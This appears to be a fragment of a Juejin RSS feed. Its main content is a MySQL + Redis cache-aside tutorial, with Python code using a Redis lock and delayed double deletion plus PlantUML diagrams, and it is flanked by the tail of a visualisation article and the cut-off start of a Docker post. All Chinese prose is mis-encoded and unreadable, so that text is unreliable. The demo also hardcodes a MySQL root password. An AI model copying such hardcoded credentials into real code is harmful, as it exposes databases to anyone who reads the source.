<p>åšæ•°æ®å¯è§†åŒ–ï¼Œä¸ä»…ä»…æ˜¯å†™ä»£ç ç”»å›¾ï¼Œæ›´æ˜¯ä¸€åœº <strong>â€œæ³¨æ„åŠ›äº‰å¤ºæˆ˜â€</strong>ã€‚
é€šè¿‡è¿™ 6 ä¸ªæ ¼å¼å¡”åŸç†ï¼Œæˆ‘ä»¬ä¸æ˜¯åœ¨æ”¹å˜æ•°æ®æœ¬èº«ï¼Œè€Œæ˜¯åœ¨ä¼˜åŒ–æ•°æ®çš„å‘ˆç°æ–¹å¼ï¼Œè®©è¯»è€…çš„è„‘åŠ›æ¶ˆè€—é™åˆ°æœ€ä½ã€‚</p>
<p>æ¯æ¬¡æˆ‘ä»¬ç”»å›¾æ—¶ï¼Œä¸å¦¨é—®è‡ªå·±ä¸€å¥ï¼š</p>
<ul>
<li>â€œè¿™äº›æ•°æ®åº”è¯¥æ˜¯ä¸€ç»„å—ï¼Ÿå®ƒä»¬é å¾—å¤Ÿè¿‘å—ï¼Ÿâ€ï¼ˆé‚»è¿‘ï¼‰</li>
<li>â€œé‡ç‚¹æ•°æ®çªå‡ºäº†å—ï¼Ÿâ€ï¼ˆåŒ…å›´/ç›¸ä¼¼ï¼‰</li>
<li>â€œè§†çº¿æµåŠ¨é¡ºç•…å—ï¼Ÿâ€ï¼ˆè¿ç»­ï¼‰</li>
</ul>
<p>æœ€å¥½çš„å¯è§†åŒ–ä¸æ˜¯å±•ç¤ºæ‰€æœ‰æ•°æ®ï¼Œè€Œæ˜¯å¼•å¯¼è§‚ä¼—çœ‹åˆ°æœ€é‡è¦çš„ä¿¡æ¯ã€‚æ ¼å¼å¡”åŸç†å°±æ˜¯æˆ‘ä»¬å®ç°è¿™ä¸€ç›®æ ‡çš„å¼ºå¤§å·¥å…·ã€‚</p>
<p>å¸Œæœ›è¿™ç¯‡æ–‡ç« èƒ½å¸®åŠ©ä½ åœ¨åˆ›å»ºæ•°æ®å¯è§†åŒ–æ—¶ï¼Œæ›´åŠ æœ‰æ„åœ°å¼•å¯¼è§‚ä¼—çš„æ³¨æ„åŠ›ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[MySQL + Redis ååŒ ç¤ºä¾‹]]></title>    <link>https://juejin.cn/post/7589935326783094818</link>    <guid>https://juejin.cn/post/7589935326783094818</guid>    <pubDate>2026-01-02T07:18:13.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589935326783094818" data-draft-id="7590104561475305524" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="MySQL + Redis ååŒ ç¤ºä¾‹"/> <meta itemprop="keywords" content="Redis,MySQL"/> <meta itemprop="datePublished" content="2026-01-02T07:18:13.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å“ˆé‡Œè°¢é¡¿"/> <meta itemprop="url" content="https://juejin.cn/user/3678304397695056"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            MySQL + Redis ååŒ ç¤ºä¾‹
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3678304397695056/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å“ˆé‡Œè°¢é¡¿
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-02T07:18:13.000Z" title="Fri Jan 02 2026 07:18:13 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-02
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><strong>æœ€å°å¯è¿è¡Œã€å¯å¤ç°</strong>çš„ã€ŒMySQL + Redis ååŒã€ç¤ºä¾‹ï¼Œåœºæ™¯é€‰æœ€ç»å…¸çš„<br/>
<strong>ã€Œç¼“å­˜å‡»ç©¿/ç©¿é€ä¿æŠ¤ + è¯»å†™å¹¶å‘ã€</strong>ï¼š</p>
<ol>
<li>ç”¨æˆ·è¡¨åœ¨ MySQLã€‚</li>
<li>çƒ­ç‚¹ç”¨æˆ·æŸ¥è¯¢å…ˆèµ° Redisï¼Œç¼“å­˜æœªå‘½ä¸­å†å›æº MySQL å¹¶å›å¡« Redisï¼ŒåŒæ—¶è§£å†³å¹¶å‘å›æºé—®é¢˜ï¼ˆç®€å•äº’æ–¥é”ï¼‰ã€‚</li>
<li>ç”¨æˆ·ç§¯åˆ†æ›´æ–°æ—¶ï¼Œ<strong>å…ˆå†™ MySQLï¼ŒæˆåŠŸåç«‹å³æ·˜æ±°ç¼“å­˜</strong>ï¼ˆCache-Aside æ¨¡å¼ï¼‰ã€‚</li>
</ol>
<p>åˆ›å»ºåˆå§‹æ•°æ®</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- è¿ä¸Šå®¹å™¨é‡Œçš„ MySQLï¼š</span>
<span class="hljs-comment">-- docker exec -ti db /bin/bash</span>

<span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> <span class="hljs-keyword">user</span> (
    id          <span class="hljs-type">BIGINT</span> <span class="hljs-keyword">PRIMARY</span> KEY,
    name        <span class="hljs-type">VARCHAR</span>(<span class="hljs-number">50</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span>,
    score       <span class="hljs-type">INT</span>         <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span>,
    updated_at  <span class="hljs-type">TIMESTAMP</span>   <span class="hljs-keyword">DEFAULT</span> <span class="hljs-built_in">CURRENT_TIMESTAMP</span> <span class="hljs-keyword">ON</span> <span class="hljs-keyword">UPDATE</span> <span class="hljs-built_in">CURRENT_TIMESTAMP</span>
);

<span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">VALUES</span>
(<span class="hljs-number">1</span>, <span class="hljs-string">'alice'</span>, <span class="hljs-number">1000</span>, NOW()),
(<span class="hljs-number">2</span>, <span class="hljs-string">'bob'</span>,   <span class="hljs-number">950</span>,  NOW()),
(<span class="hljs-number">3</span>, <span class="hljs-string">'cc'</span>,    <span class="hljs-number">820</span>,  NOW());
</code></pre>

<pre><code class="hljs language-python" lang="python"><span class="hljs-comment">#!/usr/bin/env python3</span>
<span class="hljs-comment"># -*- coding: utf-8 -*-</span>
<span class="hljs-string">"""
MySQL + Redis ååŒï¼ˆå®Œæ•´ç‰ˆï¼‰
1. Cache-Aside + å»¶è¿ŸåŒåˆ ï¼ˆå†™ï¼‰
2. åˆ†å¸ƒå¼äº’æ–¥å›æºï¼ˆè¯»ï¼‰
3. ç®€å•é‡è¯• &amp; æ—¥å¿—
"""</span>
<span class="hljs-keyword">import</span> json
<span class="hljs-keyword">import</span> time
<span class="hljs-keyword">import</span> logging
<span class="hljs-keyword">import</span> pymysql
<span class="hljs-keyword">import</span> redis
<span class="hljs-keyword">from</span> contextlib <span class="hljs-keyword">import</span> contextmanager
<span class="hljs-keyword">from</span> threading <span class="hljs-keyword">import</span> Thread, local

logging.basicConfig(level=logging.INFO, <span class="hljs-built_in">format</span>=<span class="hljs-string">"%(asctime)s %(levelname)s %(message)s"</span>)
log = logging.getLogger(<span class="hljs-string">"collab"</span>)

<span class="hljs-comment"># ---------------- é…ç½® ----------------</span>
MYSQL_CFG = <span class="hljs-built_in">dict</span>(host=<span class="hljs-string">"127.0.0.1"</span>, port=<span class="hljs-number">3306</span>, user=<span class="hljs-string">"root"</span>,
                 password=<span class="hljs-string">"DjAnGoBlOg!2!Q@W#E"</span>, database=<span class="hljs-string">"redis_demo"</span>, charset=<span class="hljs-string">"utf8mb4"</span>, autocommit=<span class="hljs-literal">True</span>)

REDIS_CFG = <span class="hljs-built_in">dict</span>(host=<span class="hljs-string">"127.0.0.1"</span>, port=<span class="hljs-number">6379</span>, db=<span class="hljs-number">0</span>, decode_responses=<span class="hljs-literal">True</span>)

CACHE_TTL = <span class="hljs-number">60</span>
LOCK_TTL = <span class="hljs-number">5</span>
RETRY = <span class="hljs-number">3</span>
<span class="hljs-comment"># -------------------------------------</span>


<span class="hljs-meta">@contextmanager</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">get_cursor</span>():
    conn = pymysql.connect(**MYSQL_CFG)
    <span class="hljs-keyword">try</span>:
        <span class="hljs-keyword">with</span> conn.cursor() <span class="hljs-keyword">as</span> cur:
            <span class="hljs-keyword">yield</span> cur
    <span class="hljs-keyword">finally</span>:
        conn.close()


<span class="hljs-keyword">class</span> <span class="hljs-title class_">UserService</span>:
    <span class="hljs-string">"""ä¸šåŠ¡å±‚ï¼šå±è”½ç¼“å­˜ç»†èŠ‚"""</span>
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):
        self.r = redis.Redis(**REDIS_CFG)

    <span class="hljs-comment"># ---------- è¯» ----------</span>
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">get_user</span>(<span class="hljs-params">self, uid: <span class="hljs-built_in">int</span></span>) -&gt; <span class="hljs-built_in">dict</span> | <span class="hljs-literal">None</span>:
        key = <span class="hljs-string">f"user:<span class="hljs-subst">{uid}</span>"</span>
        <span class="hljs-comment"># â‘  ç¼“å­˜å‘½ä¸­</span>
        <span class="hljs-keyword">if</span> data := self.r.get(key):
            <span class="hljs-keyword">return</span> json.loads(data)

        <span class="hljs-comment"># â‘¡ åˆ†å¸ƒå¼äº’æ–¥ï¼ˆç®€å• SET NXï¼‰</span>
        lock_key = <span class="hljs-string">f"<span class="hljs-subst">{key}</span>:lock"</span>
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> self.r.<span class="hljs-built_in">set</span>(lock_key, <span class="hljs-number">1</span>, nx=<span class="hljs-literal">True</span>, ex=LOCK_TTL):
            time.sleep(<span class="hljs-number">0.05</span>)                       <span class="hljs-comment"># 50 ms åé‡è¯»</span>
            <span class="hljs-keyword">return</span> self.get_user(uid)

        <span class="hljs-keyword">try</span>:
            <span class="hljs-comment"># â‘¢ double-check</span>
            <span class="hljs-keyword">if</span> data := self.r.get(key):
                <span class="hljs-keyword">return</span> json.loads(data)
            <span class="hljs-comment"># â‘£ å›æº</span>
            <span class="hljs-keyword">with</span> get_cursor() <span class="hljs-keyword">as</span> cur:
                cur.execute(<span class="hljs-string">"SELECT id,name,score FROM user WHERE id=%s"</span>, (uid,))
                row = cur.fetchone()
                user = {<span class="hljs-string">"id"</span>: row[<span class="hljs-number">0</span>], <span class="hljs-string">"name"</span>: row[<span class="hljs-number">1</span>], <span class="hljs-string">"score"</span>: row[<span class="hljs-number">2</span>]} <span class="hljs-keyword">if</span> row <span class="hljs-keyword">else</span> <span class="hljs-literal">None</span>
            <span class="hljs-keyword">if</span> user:
                self.r.setex(key, CACHE_TTL, json.dumps(user))
            <span class="hljs-keyword">return</span> user
        <span class="hljs-keyword">finally</span>:
            self.r.delete(lock_key)

    <span class="hljs-comment"># ---------- å†™ ----------</span>
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">add_score</span>(<span class="hljs-params">self, uid: <span class="hljs-built_in">int</span>, delta: <span class="hljs-built_in">int</span></span>):
        <span class="hljs-string">"""å»¶è¿ŸåŒåˆ ç­–ç•¥"""</span>
        key = <span class="hljs-string">f"user:<span class="hljs-subst">{uid}</span>"</span>
        <span class="hljs-comment"># â‘  åˆ ç¼“å­˜</span>
        self.r.delete(key)
        <span class="hljs-keyword">try</span>:
            <span class="hljs-comment"># â‘¡ å†™ MySQL</span>
            <span class="hljs-keyword">with</span> get_cursor() <span class="hljs-keyword">as</span> cur:
                cur.execute(<span class="hljs-string">"UPDATE user SET score=score+%s WHERE id=%s"</span>, (delta, uid))
            <span class="hljs-comment"># â‘¢ å»¶è¿ŸäºŒæ¬¡åˆ ï¼ˆé˜²å¹¶å‘è¯»è„ï¼‰</span>
            time.sleep(<span class="hljs-number">0.3</span>)
            self.r.delete(key)
        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
            log.exception(<span class="hljs-string">"add_score error"</span>)
            <span class="hljs-keyword">raise</span>


<span class="hljs-comment"># ---------------- å‹æµ‹ ----------------</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">reader</span>(<span class="hljs-params">uid</span>):
    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):
        log.info(<span class="hljs-string">"get uid=%s  data=%s"</span>, uid, UserService().get_user(uid))
        time.sleep(<span class="hljs-number">0.1</span>)


<span class="hljs-keyword">def</span> <span class="hljs-title function_">writer</span>(<span class="hljs-params">uid, delta</span>):
    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>):
        UserService().add_score(uid, delta)
        log.info(<span class="hljs-string">"updated uid=%s  delta=%s"</span>, uid, delta)
        time.sleep(<span class="hljs-number">0.4</span>)


<span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():
    <span class="hljs-comment"># é¢„çƒ­</span>
    svc = UserService()
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> (<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>):
        log.info(<span class="hljs-string">"preload %s"</span>, svc.get_user(i))

    <span class="hljs-comment"># å¹¶å‘</span>
    threads = []
    <span class="hljs-keyword">for</span> uid <span class="hljs-keyword">in</span> (<span class="hljs-number">1</span>, <span class="hljs-number">2</span>):
        threads.append(Thread(target=reader, args=(uid,)))
        threads.append(Thread(target=writer, args=(uid, <span class="hljs-number">10</span>)))
    <span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> threads:
        t.start()
    <span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> threads:
        t.join()

    <span class="hljs-comment"># æœ€ç»ˆæ¦œ</span>
    <span class="hljs-keyword">with</span> get_cursor() <span class="hljs-keyword">as</span> cur:
        cur.execute(<span class="hljs-string">"SELECT id,name,score FROM user ORDER BY score DESC"</span>)
        log.info(<span class="hljs-string">"final mysql rank:\n"</span> + <span class="hljs-string">"\n"</span>.join(<span class="hljs-string">f"<span class="hljs-subst">{r[<span class="hljs-number">0</span>]:&gt;<span class="hljs-number">2</span>}</span> | <span class="hljs-subst">{r[<span class="hljs-number">1</span>]:&lt;<span class="hljs-number">5</span>}</span> | <span class="hljs-subst">{r[<span class="hljs-number">2</span>]}</span>"</span> <span class="hljs-keyword">for</span> r <span class="hljs-keyword">in</span> cur.fetchall()))


<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">"__main__"</span>:
    main()
</code></pre>
<p>umlå›¾å¯ä»¥æŸ¥çœ‹</p>
<pre><code class="hljs language-rust" lang="rust">@startuml
title MySQL + Redis ååŒæ—¶åºï¼ˆCache-Aside + å»¶è¿ŸåŒåˆ ï¼‰

actor å®¢æˆ·ç«¯
participant Redis
database <span class="hljs-string">"MySQL"</span> <span class="hljs-keyword">as</span> MYSQL

== è¯»ï¼šç¼“å­˜æœªå‘½ä¸­ ==
å®¢æˆ·ç«¯ <span class="hljs-punctuation">-&gt;</span> Redis: GET user:{uid}
Redis -<span class="hljs-punctuation">-&gt;</span> å®¢æˆ·ç«¯: nil
å®¢æˆ·ç«¯ <span class="hljs-punctuation">-&gt;</span> Redis: SETNX lock:{uid} <span class="hljs-number">1</span>  ex=<span class="hljs-number">5</span>
alt è·å–é”æˆåŠŸ
    å®¢æˆ·ç«¯ <span class="hljs-punctuation">-&gt;</span> MYSQL: SELECT ... 
    MYSQL -<span class="hljs-punctuation">-&gt;</span> å®¢æˆ·ç«¯: user è¡Œ
    å®¢æˆ·ç«¯ <span class="hljs-punctuation">-&gt;</span> Redis: SETEX user:{uid} <span class="hljs-number">60</span>  <span class="hljs-title function_ invoke__">json</span>(user)
<span class="hljs-keyword">else</span> è·å–é”å¤±è´¥
    å®¢æˆ·ç«¯ <span class="hljs-punctuation">-&gt;</span> å®¢æˆ·ç«¯: <span class="hljs-title function_ invoke__">sleep</span>(<span class="hljs-number">0.05</span>)
    å®¢æˆ·ç«¯ <span class="hljs-punctuation">-&gt;</span> Redis: GET user:{uid}  \né‡è¯•
end
å®¢æˆ·ç«¯ <span class="hljs-punctuation">-&gt;</span> Redis: DEL lock:{uid}

== å†™ï¼šå»¶è¿ŸåŒåˆ  ==
å®¢æˆ·ç«¯ <span class="hljs-punctuation">-&gt;</span> Redis: DEL user:{uid}          <span class="hljs-comment">// ç¬¬ä¸€æ¬¡åˆ </span>
å®¢æˆ·ç«¯ <span class="hljs-punctuation">-&gt;</span> MYSQL: UPDATE score=...+delta
å®¢æˆ·ç«¯ <span class="hljs-punctuation">-&gt;</span> å®¢æˆ·ç«¯: <span class="hljs-title function_ invoke__">sleep</span>(<span class="hljs-number">0.3</span>)             <span class="hljs-comment">// å»¶è¿Ÿçª—å£</span>
å®¢æˆ·ç«¯ <span class="hljs-punctuation">-&gt;</span> Redis: DEL user:{uid}          <span class="hljs-comment">// ç¬¬äºŒæ¬¡åˆ </span>
@enduml
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fc91c7c26b7f42adaea47b64be219e48~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZOI6YeM6LCi6aG_:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767943092&amp;x-signature=uLYQ%2BIpix4DS7juza2%2BXctbS14U%3D" alt="image.png" loading="lazy"/></p>
<p>ç±»å…³ç³»å›¾</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-variable">@startuml</span>
class UserService {
  <span class="hljs-operator">-</span>r:Redis
  <span class="hljs-operator">+</span>get_user(uid:<span class="hljs-type">int</span>):dict
  <span class="hljs-operator">+</span>add_score(uid:<span class="hljs-type">int</span>,delta:<span class="hljs-type">int</span>)
}

UserService <span class="hljs-comment">--&gt; Redis : ä½¿ç”¨</span>
UserService ..<span class="hljs-operator">&gt;</span> MySQL : é€šè¿‡ get_cursor()

note <span class="hljs-keyword">right</span> <span class="hljs-keyword">of</span> UserService
  Cache<span class="hljs-operator">-</span>Aside
  å»¶è¿ŸåŒåˆ 
  åˆ†å¸ƒå¼äº’æ–¥é”
<span class="hljs-keyword">end</span> note
<span class="hljs-variable">@enduml</span>
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fd4a0dba574e4ade9dc109843e220ad3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZOI6YeM6LCi6aG_:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767943092&amp;x-signature=flsdLHw%2BB0bd7%2FyZHSoqFRkmHGA%3D" alt="image.png" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Docker Compose Pull è¶…æ—¶ä¸ä»£ç†è¸©å‘è®°å½•]]></title>    <link>https://juejin.cn/post/7590071125398175784</link>    <guid>https://juejin.cn/post/7590071125398175784</guid>    <pubDate>2026-01-02T06:54:11.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7590071125398175784" data-draft-id="7590128405350400000" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Docker Compose Pull è¶…æ—¶ä¸ä»£ç†è¸©å‘è®°å½•"/> <meta itemprop="keywords" content="å‰ç«¯"/> <meta itemprop="datePublished" content="2026-01-02T06:54:11.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Johnnyhaha"/> <meta itemprop="url" content="https://juejin.cn/user/1398234521279502"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Docker Compose Pull è¶…æ—¶ä¸ä»£ç†è¸©å‘è®°å½•
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1398234521279502/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Johnnyhaha
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-02T06:54:11.000Z" title="Fri Jan 02 2026 06:54:11 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-02
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»1åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body 